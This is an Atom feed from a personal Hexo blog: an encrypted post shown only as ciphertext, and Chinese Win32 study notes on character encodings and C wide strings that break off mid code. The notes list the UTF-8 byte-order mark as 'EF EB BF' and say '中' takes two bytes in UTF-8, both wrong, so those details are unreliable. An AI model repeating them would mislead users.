<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>郁涛丶&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-27T05:57:59.709Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>郁涛丶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>胡言乱语&amp;自言自语</title>
    <link href="http://example.com/2099/12/31/TOP/"/>
    <id>http://example.com/2099/12/31/TOP/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2021-11-27T05:57:59.709Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="9e0d3fa274fb94ddc6ec19b57a992bafd332081c1d4e40ef7d9c34d881b3f6fa">994f9c06d970fb4aead1c76eb2a7916edca777817bab25f58884ffe78bad7be7c6b935a333e0124fac9001c62404ee37855d54780a422ae33408d909736f309ae84efd21adb5f8c40e787b5eaf2621116c5894c2a5241c56ed7519563e9614485b46f430fcade9bf2170f5fbd301308d45108fc1594abfec11dc5f9e61f33ab8b35b3cf0d344f50cf26d2004e0f44a7fb549b1560c3ea6ffd43cb8124a781224b7cacd30ed171c08e6c9ff5d5b33ca13a87812c74f38fbcec4fdf25dd6c5e9fe2651d4b1089cf7defb3864cc6a1313bc2e38b8108e590ae6c3bfb7af4bad426930199ae4cc90b0b37d3749f97c6580d71f125f183ead22943df802e89eea3d9fd24cc9cf2c0157ad7bef082d1635f41c2cbb4d5afd89f26f641650be944aec3b75aff49b3c9471670dabd060d9bac1d08592be3b8e8315b3eb7b7ccf788b1df0021a85cf2c397e419439198b1fd0c73d552e03cf6ae199506aea91a8e7f6dfbf492d717e75e86e7bdede45b34ee76e2df947cfc22a8d0b8d59cf9b7ca397a1e0a5027ac3d1fd86d8f8606bd3e8dbcba76727542a568a0a7e5318a27b1bd6faa672648f54ac3de38b4da7e1e8b063ef415684b73d3f8a58cadfd573e0f17807d27960691eb162489b80c2a5817bc0b7fbae190e2e6818294c1056726ec978749c69a415f32e6b62a9f2cf87d22a8059656ff15eab05361c5cf14a9881332b8f15cacbd3b728b7a1972dff40813d37b835c0faf288758cc77277d0ba746e869e0dbdefa2687056dc1c90efbfeafffe2b75ccb7e6654a28ac7cfa1ae3c6fb61d05830b5c326a097d75a5cfb7ff67957b45bc16fd5fa3725a38d047330f2b06b556b3360040a9f326773f56e38e010c58bc470f036da4a13ed90bddbced287e39d6a61d1d2407fe99ec9d0a607b0f5a33dd602afcacaaa2bde535a05fc967cf4f9c41063151a211323263fca84cc9730eadf69864714cd2296f053912a5434525e5df612bfce21e2e8a204282d0659f828745b00343db9f9f04642d6b39bf78d2973ee0e15fef20a90983ee74aaaff7bd955cb5639f94eb6d558bb31fa872407aab447999cd4150fa831b9ec0ef6a64ef178f0abf1eb0e6b12b9610941b4fdb55f03e937d07c1d15caa2d60612bc0ec59fead4a5080d2874a87317d8849de3bc05fbfa63c3ca9bfc7ae0fb2677bf54b43d048b8ab1f69c763259219beae0316d46a03f05cb7bb1aa0ccd46b8584b3d46cc6961784b96c5b9239271fd4149e19aac8304e47cbbd748306064b6ed3ebe4eb4e8c3a867fecd0aa9ee53c3c70bae454a02f9a6edbead193cade72bd42589facc7200a5588e1c7311314ac9f8b44640ae503f0fcba714a35ab72ddeb81438d2dcce291c8fae51c2afa55b4142897665c7e0cd52f06512c6f7506a469be65304fd225ad176ad42475feebac5fe93d04923760a3a9da66f6b54cd07cc96d335fdd3922bb5f992a622a66f33607ffc04efcc00fa723f3aa3d34233184ca8a4cfcf8acc2b27456ab4e8e6a4d3eb050c6bb6e5f918836429e325e595205371366b0d710045c7a66baa63666f159c9f958b72b68ab348d2eed19fb0cbceb74afba5f230391823ce18954c76cdf951d0262b09cf22f5c30231ab175308ab6ea6901f7983bbbfde3b098b1a1a49e41906239e9009f7881e6ab9be74223980046d7f75c0383f73d497564a9a6706e376bcc13f4046945c2cbc622d74e018c14c07f0657a1778c12fbbad55f5e850972621c280fd8b4cd41b437a2cb0dd640b3c93ead23c97ff42faf6b0f3a7008340de3e8924f56d21e807df1031ccd38ce88299cd0ef064400e202dcbaffb696734bddbe65a0a04c645c797d8782ad95a6e2c302f0631aaa8753705768594d339b084a3958881e4c7e4f2c5cd6baedfbb61ff4d04b0edd1a74f7361f840c5dc258f408b1067c40eace4906e6ae741df49c9eb10f8ab948a12bb01279aed367b66dbb563786ccc38af4121ddb98c643e2dac8d97b123e4112d53bb3fa76ab20239bee0e3502619adde4255e27336889fc1d0af6cda4683bb101bbe9c1ec945292cde610efd60638213becb79a091cf1d097f736688b7a40ee469767f3312df7387c3137453e3942bcecf5841e85d60f106daf136bb1f1dd71cf554c7ed4888e98e619acfb130f2096bfc0b9853a43fe995567e53122ee32b1ca7f946cd612d43454d37777aaa9f2656f842c23a8160cc12f536e06c1ad836ee2b6f37b8c9e3bbb8440f43ac898e260fe38dae14a3d8c1a07fab9e8fa9ac7fe6f7b861b30f8697466843bd629f1b7e2f00bdd36ae22e23384e945b0f6d9fd9c0968df155aaf15b604e375a7e0391ef5db5ae81daa8d85efe53bcb9d98f74f2b37dab68802c57e4dacb52630479f826f1299a6f6672692843a2b7dd7ca04c518b22f501a82bf48a801e9e39f974b3eccc6271e9be2e945ee77593ab649af0117c199c8fb7241875004f2d63f8cf7e9988aad5f187f1ab458fff469230a6dbd3547794b4ac8d5496fa65d7fe02e54dc10e1537b1e97d629cf267cdc70bc9246aff2fe2663d3f2446287e40dcac77abd30e8f7c060a0451f65131cd2fd94a1603fc1286d1de1f28054f5445223e8687bfd13b2d081c08e2beb2aef53607fbf2b1830fc0b6707ff0199c6e4ae6e06024f73e7a2c6fa08f0183e075c40df3f440bf5c8dbeb102a2eb487d52ff0149810d288b7dfbbda33068218c642f1b6fed3a7489b086e97ee77de3265d49e2430b6a2e7e46786fcd32360f52ae27655ead8de515a543cce9c3f7ede66e6882b01558a0a3a694c225e23dac107d56bbdaf7b66e9d71584ccfce50dede8b19dda484b374205035d17ac7b6728dffcf617f3af63fba9216862b60d2e3c4f21274f921058ee7ea2984b6d24927a60fd46ae7308d55ae123d6586e580648b9df563d6418ad3cc463a4f4688e424155edb9c6e888bcaf0093534b792df8e0fcab63a5b33274dfd5dbdbd42f01274197a3592b4fb7ce92fd86a05e140b08c63008faf4fafb576137af7b262ca9eae29c7b67dfc5899790fab335d3d0758ec82893cccb2c53704f0c6c589328a914104334c603f4d1a91039ac1e323338f3a0263050a99659ff590e8146959fa6450e079454e019c88aac64b7746fe30df2b7b704c163a88a4d549f4a5fccba7530dd4a5880ce2a5b925e9c87f636805750fa28a88ea41d592a2821352fd13aafdd5e2eed12140f26877fefc492734e3c62ace406c7e947df66c32e477e2cb45ed87326e1cd39112ce896a21f6c6d4a459362e4ef185c532e8e1760dbb8242111e72a7c87ca9cf006bf889b2f9cd88deb59bfad9165daf3f5fe720f8db1cfda5f7aac3f52940696d0b99a10c2b2fc8db8b652d37c494d0c06a19152885bb1d22638a7e491b122fc0ee229ee3892e2a06d6ccc3b16ff0d87b0d7865ac5018920017b01269327537d7d4abf1b34f525148598ab826a8d396346937dd94f358f5fc4073aabc9b0b1c555677b9c8e10e18e8ca200c04b7ffff7d34b4b4a162627861cc9a657404357462aa40d17b4ed34325660595794fe0bc53edc8d761c39453054c48bfb64265b4f58a10d7398a2dfe583dbfb34db2412fbca8525f69460c6562a31210ad7107c1b7d6d3fd7da7aca42a311b8ec282a1408596d6357b9fb17353746075a6c8de05667db4c69ab1eedc47702dc44ad6996f05828503e84b8d38b4facc0f1ee3cd67092fa02dd62cfa95a5ecea70d83ef9bc7961d2c5155c87bea805a9157256ed65b5ba41c2d53b02f68b552b844f72d8f1aaecef950693ca90ea0f57c6175651b916c9163ade82541b9c991eb72e402c5080526683273a1a9950a273257cc817dca401c4b5b7a5de01c97d669cd3258b738e1056f1e41a5ead02e7147528c31d4a4030f88e4abf0fa3cfae4a7602d5974474182738dbd826cc3b0e62502cf7c15853cc568b33f0e730d4aeda49df7dce569935058ec8d1965d8046620a2ef383135843989ae8245a4b0b9c5ce3ef01a11eacb26ab01ac4f32d3857ab4fb2cb686913cf82ee8072195693453cba44cb303a60ac284dba978d4b6b2e165f528cdbd026f63559d5cbc097bcbb8560f1ad7ebebe1096fe4e94fefb78f93c25b3cbc532e7ad9d37450b4b8e310bdcdec528fbac28c814bc14920c21ba28e53bbaeb5f4d0ad5d5240dc74df54835de483fc72980d3287bb3b8cd4b777f218974a7e133d570e9ce3d0a97607fcdbd2177194e9b7f8d419468af4acf6726f3f3461bf40ee057b6447e8fc56a6cd7648d5b961cac170785a0d2bef5eca323c2d931ae7a017960d4392cb765c679b2179d68e42efeb15805e1917c390b28602f6ea90c6fff52f378a3c4f543a97739f8a896f8ec602ecdae1107ae3071d0fc9856abf657112b3c665bd8c75742452ca84297498b3b35e814c4b7d34f00525468e13c3e91641fe81be8daadd576c6291e94308943ceefad1662f12b0efdf82c1b734a4de798c3d11c29ad9c980e6815f6baf762059f864011d6aaeb0a4108220e8c4227da86030b1a04220f827f2075ecb6a885ac28f160cd4bcb2954a75ea11c501c28fd4ffc8ca8ff7384593a6d3e039403576e33bab8cd10070157edaf1f6470fd638c9082e951a98697327b0be1f70f3611b5b9c735f253fa1af00b89b1740cf19e9f16f3eacf0fb04f369225204a52dbdfd4099466e6777c9eba93937a4cf067ab455fe2fd13a02501de26e71a18a99c0d83fcb0a781c74cfa77775a206fb7b0f557441218c6934c3bb0504ef9497c3185edb376dff5b22c7d7dc7586281e6dd44aef74a7e2b6445f882ff3ee3b7523ff67d6353fffe371e65951e3245506b6c2888049564f0401e6fab89b3805ad437073343e1cf805450ae3990028ae59f7e69b95b6f0cf3e0037a2c70af7bfe6db34be46ad4b8df72f8dede270954e4b8997cc2268a8ffe6c5099935de5181d3b27fca5e4e3f59a3ffb336f5b1f01b719533ea880b258d8505c626547197dcc35ed4ae2f2eedcaddccc390244d465b1c9818b378ecec8f40cd5303ff3b0d4db327e696165c135b6f625ebef1ff7af846a5e56adde5f5d9ed2a7ca71decfa49bb68f86bf75c743b7880eb3596194840319f8e8d306e221cb5f05df95dc418c6e1629beadaca65a40a83aaf0cf6f0fe28170846f6525aeff1df9265d6c550a1ab05899e4e1c87c3e5d7ed25d4430307a3c99ec149050e520490c6715f3a79b901f6e546eb134796332931bad4305d03b6310acbde98802673f2d5cf18df3656855e3663670209d5bd5009798575d7a0afc8c28acf382c55026de1f365b097ffa26b49acbc07ecf4ddc131159e9cedf80bb9739daf1558803f8891112329a338ae193df55ca2bb10de1c7214c0574afae35b16b12da1e0fa99622721e8fc21027f8449b069157771a634af61b2e143d971515373a3b7b85f1efcbe0e80e592fb0a7ea2b809486be74a6c24ed23f7e2eb94bea43a1a58138bf8d4a11c85f13f4a7166adb79e4a0643e895b5d60690513ef1019451faf3e40893c52a6c5ee017cf370f1a08aa3a2e7f9bffcd30efd9464e29be54efc28ac9f28f7875f2bf1ffd858c7d67bb9f5ac05408c10a2ffb1a1f80dbd242ad7030ab959d08dee3a197b7dce67ac05388723cde2320385a0fcbb77c0be65ab438cbb967ac15a9157e433c8817fb35952901ca9d5df585557270af0ff67f915d256f8624a5626cbec9fcbec853a9b749fbe42f03c605b3891b72992634f0afa07b9a87451c7fc77a66449cb10b64b2b078e2494180fa2a192d389a2ec9841541f503f04a2f4e013a890ef7659bb32610aeee90bb8844e8fd5a57ede6d06e59617c8b6cedcb6c36a051711f8be913afbeb62232ae84e5877a8f87c70271938c88b181d12774dd46b98c26a3861a5d38b4dc190b1a20fa8bc4415e5095378abfef0b088f61335416091beedf5df4af09c06b9e7729011a98b0fdf1221db34b08273341898b74d479ce0ee55f9a4fbff7a5294ca15c55670490fdb09b73f8ec56c65435e17548380e48fc65ad1ab00689c5acca8858ee9514aea0a01feaf5d25958ea0631c19e513bdcbbf2a022c84d6dc82729fe1983fe44ed475d91aee54c44f0e0c3df594931bc98db1e5203114d0535cd0c6f8332cbaa1d4f69a7ebd11e0be713e0034929ea05caec11809920a7879a4e81fb9189b0c193fec91dc2c7f77c12a2a3ccc4cbbbe53a327e85364b594ebb7d14f48c3928828dc45bb680c5a3dc0e0d101fa661d4b956c96ce42ef386d1f5d9c603b2371cdec6960a958c7624275463b41e390996bd1088ddd879fb16d094ceac8d3579bda2b003f945db406643c0b811358eb7e53e8fad000e7e77773ada274840abffdae218bda48aa9d2b2421597cf64fa63e650659b88c696e95907c9f1bf2c1ea3af0edcd194f1729648b110accc483e58db0b4e8a1f3b6e6eeba31a4657a9e55d09673a92580ec5ceca6172a936f379392d964972820457a60d42112c78286606775eb14a56ef745b2b6b39278485afccebad282de8c7f3525edb9a90dfff44fe801036f7518875a6be04a8d56b31b8b6ed3c75b31bda84206f28b10ef7ee116cfca1893247d07137dd4696698cf886b8a2186e7cae1ccf18e33dac5c97242cfddb0816d0c6b766a136fb1be3ccb8121090084bceffb4ae247177394ec0eaff32401a51128791e923b713ce32a75929557f253a79f8dd9a24ec97af2898f02c447ccd3501aa8aad2081fcfa3eccdf62d726a26d67d896a2fe80c7a5a13323997471c6f4a67b0429378412b0f70a2ad6c29d37b84c09c137cc460d08e742a510bfba390e0ae76daef43c209c004eb74b7a3b5f52372811c00c8d37e93171e8e8ba90e6cdd35dda471ee7906c282b985370da71ecb3b61af37611f4effb82de1a96dd5dd3d7067e61591ea607f15c9998be282202256ab6e27f3fbb5eaa6bc49e497b8368aa2b822e7ee72f032ffeebc6b2961889e8fd8d8fae1087660757b42c335132ace0533e36e3ee84a6bbef5bd83165c9e382efe024e509858db7a0b49d86089903b62255800e1fc34f4c6d96c5f58cd695832718c01e2838bde6fa90098915ca5d5c71c5cf48880f4e0f55c59b0037df0852714e2064edbf4c08a8144ac7e7b75f8a6e75a0283bd3f668a00ca965ef8c722485a6b0de93211050af0c9f0e5019ed5e76b9c24ccc874c53edb4c962c72b2e4851ef980db9e6b34b6642e6980d77e1161a908466e2b71e003c01f4a032d9d9876f928d9481ebb784645b9faa5b24fdfa4b2cbb2bcbe905765fe09e7f0623cc0acb255b517ad5c28a60e2efda304d3531586a560ca67c52028d3ab769600fecf65b4013c2d32f08f806772090dd0b059906c8fe79562eddaee382216112b223581c465ac8a35f93814fe22170a6f1fa23e3630b5caf39938c8ef9a466116f4ca4f901ff40207a7baac53b2e1b1d79344e6adc9137b2a9941ea38f75d18cd703d0d2ed2baf38c50b8eb49703efdfdc78422b31f7bd03758d93ce38e6100098959b848b96b18cb447bd7e8fc8064af272ef8a9a23bacd0f66141263a92f0767f79454288e748ebce587e509d277f312351c9f2d5d5745f9fa9876f7277c06e7442ebc7fa3a338ac7accc098164be2ca417c78dc0b8c2116522b702a0db8864607fb20053c4aa8acaaf134c8a6c24890283aaeffc7b174e28cbe6d72dfedfe1cdff55ae8079ffdbc1f193e51278269d7e063ae0dbdabd2eb6f8ecf6ed7279cbf4ff0c48ba3520467d8673f5ce540dac33e6ea37a4ea394d11aad278d8d350463941a2f786abd9aa5304d56f2bc0b3a0a6a0e1b56cdfa44aedaffc059ffd32e5cf97094b3f961f288b1f08f033d4ac351a65e49a547ce507c90b9b999dd4d27c49f4b179914df44c380cb026c2dc09da37f61bddf359a33ab5a95e7bada3dee4b594fb4edd72aaf89d9a5bc4e4647241dc4b6fa1564632bdd34c15e13b1e92070e00a2eec3a6e27ac4a824536e8b19c19cbc0877cef96b994363173e9b6f640517a4c4d4d49cffc579646c02f4b81c78364cfd6d547fb903b9df7ad507851524ab4ed57cd991361d661b1019495c2008359b1c358bc591edbfdf2601063739162958201a2a75eba90acd46936a4fca7fcdd6853448858489e199554450113c916f08b598c51b04e79a1048b4fe9d13d277cd0a2ee502554c27907c0d55d3463e9f7893feb8717a05cef1ae52b51cc5c5883afefe57ad7521b5372f2344a30ba141aab883c01a4bdec08cd06c53b30476d532ba180eb836d34cf377e07d6b381059e05f6db9ef008422856c8f9717c5c9e34a994160851147851a5c3d4fb4b6f3b365e2823911dc556a58a7752e307e763b400da436de3e658bff43f92bedecd2a67b9824d28c9fa1a5542dd08a3dfbcbbc2b8a27f0b0ee87931cb12dc166b2814971b7cbcc9df075f59a1ca51c389cedf910ebf90e762af7ae0e4081d739148c8feba8208d25c0e2cb65b21dbe6baa027f47a6f73dc8141662585bf036992399b3bd67490810432455d534bc4895e8f72d38b91d50d5507e2a9ee9865cf7be0e52266f1890d749877cb4d7a5cebc7af8d98dffb44ba0c8c4c3845db3495f37f9675a8bebc46d61b018222a0eabddd9b26aa13736d4b2355e74be8dc4987ae7fc2d3e1726e4f3eea4993cb998a2a3157ff199e39f885b774be67d718764cbb32ba3f9248d5daf9a00fba0f056b240f41b50ed4020c114ac5aecd8a8684fc6dfbb198d46990f2a8cf8c5bd18ab5cf26e603eedbfc5287ff0d9da64436cadf7ea1629badddf83ef2e7bcaaf2b02e26af9f350f35b06f116d3fd7a0a228829ed7163e6ef2d436ba4fde7e6240df78948843a7df7e175aa05bd0bb71e1b1542628fb2682674af03658b4842bf1cf17637cd5ed2b86b92dc5b69b21e1ee97e0e913916ff8001a0e299eba2bc4b0aa094db407dee2c30b30d401f5bc8cdddc1fe244a461d70c32151c6aa0b59a8773f754202440cf90a3230c661e673ce7cf470825f969b5346cadedcc382cd8a43afad582bd02be416e31f5b9c26c16e09a9a2e6179bbe0cb6ffd719d2ad53a1e4d36f49756685bfc5cd160f6fa628f067ab98359577b311126b61defa038329487510b25bb0d34093f3b13e790edbaf95fc26977a624d054dfa1fba993d866e1536b16e4e1fd660cfa27d74ce1d77057c041afc058a562283752cf14b6b5bd843deda818a2494b0572c72175384e9882aaaf30139dc5fc7333421ac10dc3c9811bdcc7b384c0e6a8aada2d4590f26e4ce9473acdd40679730de404a064083ff3eb6c085fc2603b3c1ac179c38d0da6b1331090abb95a7531fcc4ae062211648f0cf829162d225206ce1ae1534cd4ca12fba6f96d1e2834dc2c4c74400bac5eedf651ff24327d1bf26018d6819ba88aa4f736f47a801ebf91a713b5dbaeae1ca99f5fd24399a108812cf8d9909c40312f6bed5fb66d47426d114023e0e863c064a04848ed7915b85cacaace4c8e07230a886925603af9d0481526d0ff5f7df6e1517b88fbeac19dde90a2b9c96ff14a72b42b538fb68b1f8e71369ff27964bed204135a7a66a79a16f5fd1e1fbfd50c186f117a1dad9d7b2e84a5cbfd1bf3b69faa6dde34a87198baa50c9c7dd20973658f38ac6f90e48ef85cf5553f28a545040cca30cead9e026059845612f51720f83d8033248e6821b8e3a10f562c1652b322496df32548aee278526041baaaf8fbb885487ec76ba06fd52068c2e6cd4315afb7ee50ff8b2619795b65d053afd7d34d621ed7b5081e7889e28ca205ce496b5bd64ee0251a568c7512932fe3a5cd5278d1a6d6906c9784d5fbcae0c90cfdde443d2c8564583545a5e85e099d8815ce3823aad5f56b0492ebe3672b64860aa28b75bfa03d8796a073ff5a99bcbca3a17e4afc6813afc1c1a3ea88defe8b41e4f1f9544a74a733429368ffc33a470a4a73d7bcc36bd32663033928367d44f251ddfc740278566a77c84d5949d98faa5903260e54e2301d8e630a83e753783bcf172f0733455cc8c6701ba6d2aca4ae79cee3adceafb53bb98ae0ee1d6c955adc29b8090274d7bea536e69f2ec7938f12e1d427aedb983566b9792873f951cf6b265e0fb90a0450adf93460535f35f594a005625bc0113d05fe9635c680e49ed333bf3c00add4730d91895848a3c68b634ec17a262c998c32a2b534437e569861556b3a19480a00b59398100d4b08b8ec8f2a17cebb6d3bce1492ddcdca10dd8499320e2d23a0d0008988c65c7224cf1784ff23850926840701e77dbe0436d1d2562f18f9ccb6fad85e0f5deca2bc454c45ec0d1713844483e8a8be2c7c3035f3f15d9865c11ecc119c63f426d6b69b24d2fc65a91d7f08b5f774e801e955c22f3894a27595c36b4cf8e462ae9d9e79d56c7fd70c8a100e0e87e7934619db941723e55dbd789640c20e72c0124497014bb3c9285014b1a2b7e9d751948f69ba005e1fca99bf2d93cc677f8092cd16b9e56c28095d1fa98241089b596ea3c86d554975ed09f23e15e463aaad56009822cb7f72c36f72f3cd92af69f448999f8a83d598b772af83116d73314b6b32964a8712c85acbf1b32ccb0f0e0386897aa2df589e2fbc9f612922e0a95c128548ee19fcdb1436506a13a3392added8807c78e4487668e8e1fa101152a5de0f2142e2f3239598a7bfe4dd27404a0fc8d17452f81cfaf1497e84eb8953ee0975573ba8c9937125f44dd0ffa109974dab1a91d5aeca7ed47c049d68efbecd60633c631e10d5f79d75d7c8f829c99ce05dabeb5fdf67170011cbdc125bce50d39557177ea1eac874bb21276e9025330bf6772d728dbab3076da478017b7f3e7fe7b8b67b9ef9c87d017910e3e7e85cf1f0e492ecece39dc573277c4f06ea1c368c56e0e08993bf872511720ed710ba744eb0d525a6cf2a569d5f17f4e9f4b9063f5d65d1736e665d48bb341ebb57d07396a067c2ffb964379fb90b8adceb6f9a2e697a4b2b930b477fc132baee31c4510b7665a69b7ade55b6aebea0d62cf5e15187229fe3f8dbcf5ac4c1acfe3ce8bbdbed8781eec1567a76bd604f08082afde80c7b78aca687f7167da6daf4a070b805bb050644839071509502f448ebcb977b42dbbdbabd056ce19578b29ce969f2a6da6dd93f81a86c573f195e3b8c6816380c6a2c1d9f4d710096f62f8103ca52a0a07f0625075d825c99d538c26d71952b28964fb4bfb31f933c28be621d42c7629f769f988f3162bf43aac8ab3fcbac8c669de4ef11f0e41829242291b968ce0ac6e0eafc0850f9ae68ae5baf6e7618c440ab37a41e6ef73e7f55dccf663398d566b404fc73f20db28d5d23a6ae720693014d9a939323291926c37d46a178f5016342558341432effc41ddd5143412dfbf8fc95dea4275766f3240ae939900f20de04cb87e4050c4de3ddbc4b6c95a924a929541bae74a30b4fbdab46b46aac5a4ed834cf18c4fdd6a31a828750c55516c823e369c4f1151d4ba29516a368aa2379b53c02ab92b7d6e45bade957caacaf116fe118d9130ec013427e5462b5e0b5291e772d01773d2a6d64474cafcca6bba14c08256a9d8bc21bc41a5f6e7f52259a162da3d81ed609aece0db78bd76db8de9310d02de5602382bf72fc3c06ce1e64ff240c7c339193d89a5cef3689baff7a8bf77116c6851a5dcd6f18923a9550869bc1a0162e763e48dae6c41833fe22ccbe10efcf858d8314100ae633768098c3b7fb58adac39d7327983d52748762426b6212386e677bed7b34ffe7b37c9ca59419dced47a773d4abc6ff6bbcad9938bcf4a83bde3dd24c4279240c955ae56f4e03442b0b71cb9c2b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>重拾Win32</title>
    <link href="http://example.com/2022/04/01/%E9%87%8D%E6%8B%BEWin32/"/>
    <id>http://example.com/2022/04/01/%E9%87%8D%E6%8B%BEWin32/</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-04-03T15:53:09.491Z</updated>
    
    <content type="html"><![CDATA[<p>之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！</p><p>[toc]</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Win32不是用来画界面的，如果你以后要在Windows写好程序，是必须要学Win32的；</p><h1 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h1><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p>使用指定的7 位二进制数组合来表示128种可能的字符。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401175832925.png" alt="image-20220401175832925"></p><p>最大为<code>0x7F</code></p><h3 id="扩展ASCII表"><a href="#扩展ASCII表" class="headerlink" title="扩展ASCII表"></a>扩展ASCII表</h3><p>从<code>0x80</code> 到<code>0xFF</code>：（未截全）</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401180412423.png" alt="image-20220401180412423"></p><p>对于中文韩文日文等还是不够。</p><h2 id="ASCII表的扩展"><a href="#ASCII表的扩展" class="headerlink" title="ASCII表的扩展"></a>ASCII表的扩展</h2><p>GB2312/GB2312-80，与GBK差不多的。</p><p>（GB2312标准共收录 6763个汉字，GBK共收入21886个汉字和图形符号）</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401181028760.png" alt="image-20220401181028760"></p><p>每一个都是扩展ASCII。</p><p>假设我们将“中国”这两个字发给国外的朋友，他的电脑上并没有该编码表，所以解析出 来的则不会是汉字，而会出现大家所熟知的“乱码”</p><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>Unicode编码创建了一张包含世界上所有文字的编码表，只要世界上存在的文字符号，都会赋予 一个唯一的编码</p><p>Unicode编码的范围是：0x0-0x10FFFF，其可以容纳100多万个符号</p><h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h4><p>UTF-16/UTF-8是Unicode存储的实现方式；<strong>UTF-16编码是以16个无符号整数位单位</strong>，注意是16位为一个单位， 但不表示一个字符就只有16位，具体的要看字符的Unicode编码所在范围，有可能是2字节，有可能是4字节， <strong>现在机器上的Unicode编码一般指的就是UTF-16</strong>。</p><p>会有le与be两种，就是存储方式为大端序和小端序。</p><p>举例（假的）：</p><ul><li>  中（Unicode编码）：0x1234 </li><li>  国（Unicode编码）：0x12345</li></ul><p>存储的时候，中占2字节，国占4字节（0x0001 2345）</p><p>如‘中’和‘A’的存储</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401182412900.png" alt="image-20220401182412900"></p><p>比较浪费，于是有了utf8</p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h4><p>UTF-8称之为可<strong>变长存储</strong>方案，其存储根据字符大小来分配，例如字母A就分配一个字节，汉字“中”就分配两个 字节。</p><p>优点：节省空间；缺点：解析很麻烦</p><h4 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h4><p>BOM中文为字节顺序标记，其就是用来插入到文本文件起始位置开头的，用于识别Unicode文件的编码类型。</p><p>上面的截图，有<code>FFFE</code>之类的东西，那个就是。</p><table><thead><tr><th>utf8</th><th>EF EB BF</th></tr></thead><tbody><tr><td>UTF-16LE(LITTLE)</td><td>FF FE</td></tr><tr><td>UTF-16BE(BIG)</td><td>FE FF</td></tr></tbody></table><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401183005344.png" alt="image-20220401183005344"></p><h1 id="C语言中的宽字符"><a href="#C语言中的宽字符" class="headerlink" title="C语言中的宽字符"></a>C语言中的宽字符</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASCII码：<span class="keyword">char</span> strBuff[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line">Unicode编码（UTF<span class="number">-16</span>）：<span class="keyword">wchar_t</span> strBuff[] = <span class="string">L&quot;中国&quot;</span></span><br></pre></td></tr></table></figure><p>字符串长度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> strBuff[] = <span class="string">&quot;China&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> strBuff1[] = <span class="string">L&quot;China&quot;</span>;</span><br><span class="line"><span class="built_in">strlen</span>(strBuff); <span class="comment">//取得多字节字符串中字符长度，不包含 00</span></span><br><span class="line">wcslen(strBuff1); <span class="comment">//取得多字节字符串中字符长度，不包含 00 00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);<span class="comment">//使用控制台默认编码</span></span><br><span class="line"><span class="keyword">wchar_t</span> wct[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span 